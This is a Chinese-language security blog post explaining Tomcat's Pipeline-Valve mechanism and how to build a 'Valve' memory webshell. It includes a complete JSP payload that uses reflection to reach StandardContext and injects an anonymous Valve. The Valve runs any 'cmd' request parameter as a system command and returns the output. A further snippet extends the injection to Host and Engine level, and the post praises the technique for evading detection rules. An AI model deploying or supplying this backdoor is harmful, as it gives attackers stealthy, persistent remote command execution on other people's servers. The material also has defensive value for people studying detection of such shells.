---
title: 原理分析 | Valve —— Tomcat 特有内存马
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/owQBfADXeNBEQF9knoiGUAeAwE0cElaIAAyDEP~tplv-dy-vqe2-sr-v2_1920_1079_q80.jpg
categories:
  - - 代码审计
    - 内存马
tags:
  - 代码审计
  - Java
  - Tomcat
  - Valve
  - 内存马
  - RCE
abbrlink: a7f3c8d2
date: 2026-04-11 23:30:00
---

> Tomcat 特有，比 Filter 更底层、更隐蔽。

---

## 目录

- [一、什么是 Valve？](#一什么是-valve)
- [二、Pipeline 是什么？](#二pipeline-是什么)
- [三、Valve 在 Pipeline 中是"单向链表"](#三valve-在-pipeline-中是单向链表)
- [四、Valve 与 Filter 的关键区别](#四valve-与-filter-的关键区别)
- [五、静态注册 Valve](#五静态注册-valve)
- [六、动态注入（内存马核心）](#六动态注入内存马核心)
- [七、Valve 的层级扩展（Engine / Host 级别注入）](#七valve-的层级扩展engine--host-级别注入)
- [八、四种内存马对比总结](#八四种内存马对比总结)
- [总结](#总结)

---

## 一、什么是 Valve？

Valve 是 Tomcat **Pipeline-Valve 管道机制**的一部分，属于 Tomcat 特有的概念，不属于 Servlet 规范。

### 类比：请求处理的"高速公路收费口"

为了方便理解这几种内存马的层级关系，用高速公路来类比一下：

- **Listener**：像高速公路入口的**感应线圈**（车一过就记录，不干预）。
- **Filter**：像**安检闸机**（可以拦车、检查、放行）。
- **Valve**：像**高速公路上的隧道阀门**，位于整个系统的最底层，**所有车都必须经过它**，而且它可以修改车的路线甚至把车"吞掉"。

![deepseek_mermaid_20260411_515112](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image1.png)

**每个容器（Engine / Host / Context / Wrapper）** 都有自己的 Pipeline，里面可以添加多个 Valve。

---

## 二、Pipeline 是什么？

- **一句话解释**：Pipeline 是 Tomcat 容器内部的一个**处理链**，里面可以按顺序放多个 Valve（阀门），请求会像水流一样依次流过这些阀门。

- 每个容器实例（Engine、Host、Context、Wrapper）都有一个 Pipeline 对象，这是 Tomcat 架构的固定设计。

- 即使不添加任何自定义 Valve，Pipeline 也至少包含一个 **基础阀门（basic）**，用于完成容器的核心任务（比如调用子容器、处理 Servlet）。

- 可以通过 `pipeline.addValve(valve)` 添加任意多个自定义 Valve，它们会按照添加顺序依次执行（先添加的先执行）。

请求的大致流转路径是：**Engine → Host → Context → Wrapper** 的 Valve 管道，最后才到 Servlet。也正因为如此，**Valve 比 Filter 更早触发**（在 Context 级别甚至更早），而且可以**拦截所有请求**（包括静态资源、404 等），**不需要任何 URL 映射**。

> Filter、Servlet、Listener 都属于 **Context 级别**（即一个 Web 应用内部），而 Valve 可以加在 Engine、Host、Context、Wrapper 任意一层。

---

## 三、Valve 在 Pipeline 中是"单向链表"

```
请求 → [Valve A] → [Valve B] → [Valve C] → [基础阀门] → Servlet
```

**需要注意的点：**

- 每个 Valve 的 `invoke` 方法中必须调用 `getNext().invoke(request, response)`，否则请求链会中断（后面的 Valve 和 Servlet 都不会执行）。这个和 Filter 里的 `chain.doFilter(request, response)` **作用一模一样**。

- 添加过多 Valve 会影响性能，但内存马场景一般只加 1 个。

- Valve 是**全局生效**的：添加到 Engine 的 Valve 会影响所有 Host 下的所有应用；添加到 Context 的 Valve 只影响当前 Web 应用。

- 拿到容器的 Pipeline 对象（通过反射获取 StandardContext、StandardHost 等），就可以直接调用 `addValve()` 方法，而且该方法通常是 public 的，**不需要反射破解**。

---

## 四、Valve 与 Filter 的关键区别

| 特性 | Valve | Filter |
|---|---|---|
| 是否 Servlet 规范 | ❌ Tomcat 特有 | ✅ 规范定义 |
| 触发层级 | 容器级（Engine/Host/Context） | 应用级（Context 内） |
| 能否跨 Web 应用 | 能（Engine/Host 级别 Valve 可影响所有应用） | 不能（只拦截注册的应用） |
| 需要映射 URL 模式 | 否（自动全局拦截） | 是（需配置 `/*` 等） |
| 隐蔽性 | 更高（不常见于检测规则） | 较高（但已是重点查杀对象） |

---

## 五、静态注册 Valve

静态注册是 Tomcat 管理员配置全局功能的标准方式，不需要写任何 Java 代码（除了 Valve 实现类本身）。先搞清楚静态注册的流程，对后面理解动态注入也有帮助。

### 步骤 1：编写一个简单的 Valve 实现类

创建一个 Java 项目，写一个类实现 `org.apache.catalina.Valve` 接口。

> Valve 是一个接口，实现它就必须实现接口中定义的所有抽象方法，即使不需要某个方法的功能，也要提供一个最简单的实现（比如空方法或返回默认值），否则编译就会报错。

```java
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import javax.servlet.ServletException;
import java.io.IOException;

// 实现 Valve 接口，表明这是一个阀门组件。
public class MyStaticValve implements Valve {
    // 关键：存储下一个阀门，没有这个字段，链条就断了。
    private Valve next;

    @Override
    public void invoke(Request request, Response response) throws ServletException, IOException {
        // 自定义逻辑，这里是打印请求 URI，可以替换成任何代码（如执行命令、记录日志、修改响应）。
        System.out.println("[StaticValve] Request URI: " + request.getRequestURI());
        // 放行请求，继续执行下一个 Valve
        getNext().invoke(request, response);
    }

    @Override
    // 返回 false 表示这个阀门不支持异步处理。如果阀门内部没有异步逻辑，保持 false 即可。
    public boolean isAsyncSupported() {
        return false;
    }

    @Override
    // 这两个方法必须正确配合，否则链条会断。
    public void setNext(Valve valve) {
        this.next = valve; // 保存 Tomcat 传进来的下一个阀门
    }

    @Override
    public Valve getNext() {
        return this.next; // 返回保存的下一个阀门
    }

    @Override
    // Tomcat 会周期性地调用这个方法，执行一些后台任务（比如清理过期资源）。不需要的话留空即可。
    public void backgroundProcess() {
        // 可空实现
    }
}
```

#### 补充：异步处理是什么？

- **同步**：请求进入 `invoke` 方法后，必须等 `getNext().invoke()` 返回，整个请求才算处理完。这是默认方式。

- **异步**：在 `invoke` 中，可以启动一个新线程去处理业务，然后立即返回 `invoke`（不调用 `getNext()`），让 Tomcat 线程不被阻塞。这需要阀门设置 `isAsyncSupported() { return true; }`，并且后续还要处理异步完成时的回调。

对于内存马来说，**几乎不需要异步**，保持 `return false` 即可。

---

### 步骤 2：编译并打包成 JAR

切换到正确的编译目录（对于包 `com.demo`，源文件的根目录是 `src/main/java`）：

```cmd
cd E:\WWW\Valve\src\main\java

javac -encoding UTF-8 -cp "E:\WWW\apache-tomcat-9.0.117\lib\catalina.jar;E:\WWW\apache-tomcat-9.0.117\lib\servlet-api.jar" com\demo\MyStaticValve.java
```

**几个注意点：**

- `-cp` 是 `classpath`（类路径）的缩写，**作用是告诉 Java 编译器去哪里查找用户自定义的类（以及第三方库）**。

- `MyStaticValve.java` 中引用了 Tomcat 的 `Valve`、`Request`、`Response` 等类（位于 `catalina.jar`），以及 `ServletException`（位于 `servlet-api.jar`），所以编译时必须通过 `-cp` 指定这些依赖的位置，否则编译器会报"找不到符号"的错误。

- classpath 分隔符在 Windows 上是分号 `;`，在 Linux 上是冒号 `:`。

- 如果有编码问题，加上 `-encoding UTF-8` 参数。

- `catalina.jar` 是 Tomcat 核心库的固定文件名，不能改名，确保路径指向正在使用的 Tomcat 9 的 `lib` 目录。

编译完成后打包成 JAR：

```cmd
jar cvf myvalve.jar com\demo\MyStaticValve.class
```

---

### 步骤 3：将 JAR 放入 Tomcat 的 lib 目录

```cmd
copy myvalve.jar E:\WWW\apache-tomcat-9.0.117\lib\
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image2.png)

---

### 步骤 4：修改 conf/server.xml

配置文件路径：`E:\WWW\apache-tomcat-9.0.117\conf\server.xml`

先了解一下 server.xml 的层级结构（Valve 只能在 **Engine、Host、Context** 里添加）：

```
<Server>（最顶层，代表整个 Tomcat 实例）
└─ <Service>（服务，包含一个 Engine 和多个 Connector）
   └─ <Engine>（引擎，处理所有请求，可包含多个 Host）
      └─ <Host>（虚拟主机，例如 localhost，可包含多个 Context）
         └─ <Context>（可选，代表一个 Web 应用）
```

找到 `<Engine name="Catalina" defaultHost="localhost">` 标签，在里面添加：

```xml
<Valve className="com.demo.MyStaticValve" />
```

> 写法 `<Valve className="..." />` 等价于 `<Valve className="..."></Valve>`，但更简洁。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image3.png)

---

### 步骤 5：重启 Tomcat

---

### 步骤 6：验证

访问任意 URL，控制台会输出 `[StaticValve] Request URI: /xxx`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image4.png)

---

## 六、动态注入（内存马核心）

### 原理简述

通过熟悉的反射获取 `StandardContext`，然后：

1. 调用 `standardContext.getPipeline().addValve(Valve)` 添加自定义 Valve。
2. 在 Valve 的 `invoke` 方法中解析 `cmd` 参数，执行命令。
3. 将命令结果通过 `response` 直接回显到浏览器。
4. 调用 `getNext().invoke(request, response)` 放行请求，保证正常业务不受影响。

与 Filter 内存马相比，注入 Valve 不需要操作 `FilterDefs`、`FilterMaps` 那些结构，只需拿到 Pipeline 对象直接 `addValve()` 就行，**注入步骤更少，也更简单**。

### Payload（JSP）

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>

<%
// 防止重复注入。application 是 JSP 的隐式对象，可以存储一些属性（键值对）
if (application.getAttribute("valveEchoInjected") == null) {

    // 从 request 里获取 servletContext
    // 这里的 request 是 JSP 的隐式对象，可以直接用
    // 匿名类里的代码只能用传入的参数对象
    ServletContext servletContext = request.getSession().getServletContext();

    // 两次反射获取 StandardContext
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 构造匿名 Valve
    Valve maliciousValve = new Valve() {
        private Valve next;

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            // 匹配参数，GET 和 POST 都可以
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                try {
                    // 执行系统命令
                    Process process = Runtime.getRuntime().exec(cmd);
                    // 处理命令的输出
                    java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream())
                    );
                    String line;
                    StringBuilder output = new StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    // 有 response 可以直接回显到浏览器
                    response.setContentType("text/plain");
                    response.getWriter().write("Command: " + cmd + "\nOutput:\n" + output.toString());
                    response.flushBuffer();
                    // 如果有 cmd 参数就只显示命令结果，不会显示原来的页面
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            // 没有 cmd 参数时，放行正常业务
            getNext().invoke(request, response);
        }

        @Override public boolean isAsyncSupported() { return false; }
        @Override public void setNext(Valve valve) { this.next = valve; }
        @Override public Valve getNext() { return this.next; }
        @Override public void backgroundProcess() { }
    };

    // 往 standardContext 里注册 Valve，非常简单，不用反射
    standardContext.getPipeline().addValve(maliciousValve);

    // 设置标志，表示已经注入过了
    application.setAttribute("valveEchoInjected", true);

    // 输出总数 + 每个阀门的类名
    Valve[] valves = standardContext.getPipeline().getValves();
    out.println("Valve (echo) injected. Total valves: " + valves.length + "<br>");
    out.println("Valve list:<br>");
    for (Valve v : valves) {
        out.println("&nbsp;&nbsp;- " + v.getClass().getName() + "<br>");
    }
} else {
    out.println("Valve already injected.");
}
%>
```

### 验证效果

访问 `http://localhost:8080/inject.jsp`，可以看到注入成功，列出了当前 Pipeline 中所有的 Valve：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image5.png)

中间那个就是我们自己注入的，其他的是 Tomcat 自带的。

再次访问时会提示已经存在，防止多次注入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image6.png)

然后访问任意路径带上 `cmd` 参数即可执行命令：

```
http://localhost:8080/任意?cmd=whoami
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Valve_image7.png)

---

## 七、Valve 的层级扩展（Engine / Host 级别注入）

上面的动态注入代码只添加到了 **Context 级别**（当前 Web 应用）。如果想要影响范围更广，可以向上取父容器，注入到 Host 或 Engine 级别：

```java
// 获取 Host（向上取父容器）
Container host = standardContext.getParent();
if (host instanceof StandardHost) {
    ((StandardHost) host).getPipeline().addValve(maliciousValve);
}

// 继续向上获取 Engine
Container engine = host.getParent();
if (engine instanceof StandardEngine) {
    ((StandardEngine) engine).getPipeline().addValve(maliciousValve);
}
```

**作用范围不同，Engine 最广，Host 次之，Context 最窄**。实战中根据需要选择，注入 Engine 级别隐蔽性更高，但也更容易影响正常业务，需要谨慎。

---

## 八、四种内存马对比总结

把 Filter、Servlet、Listener、Valve 四种内存马的核心特性放在一张表格里，方便对比选择：

| 类型 | 是否 Servlet 规范 | 触发层级 | 是否需要 URL 映射 | 回显是否方便 | 注入复杂度 | 隐蔽性 |
|---|---|---|---|---|---|---|
| Filter | ✅ 是 | Context | 需要 `/*` | 直接 | 中 | 中 |
| Servlet | ✅ 是 | Context | 需要具体路径 | 直接 | 低 | 低 |
| Listener | ✅ 是 | Context | 不需要 | 需要反射 | 低（注入）高（回显） | 中 |
| Valve | ❌ 否（Tomcat 特有） | Engine/Host/Context | 不需要 | 直接 | 低 | 高 |

---

## 总结

Valve 内存马是 Tomcat 内存马里隐蔽性相对最高的一种，核心优势在于：

1. **不属于 Servlet 规范**，很多安全产品的检测规则覆盖不到。
2. **无需 URL 映射**，任何请求都会经过，不像 Filter 还得配 `/*`。
3. **注入步骤少**，反射拿到 `StandardContext` 后直接 `addValve()` 就行，不需要操作 `FilterDefs` 那些复杂结构。
4. **可以加在多个层级**，灵活控制影响范围。

整个内存马系列到这里，Filter → Servlet → Listener → Valve 四种方式都过了一遍，后面还有 Agent 内存马，原理上又是不同的思路，到时候再写。
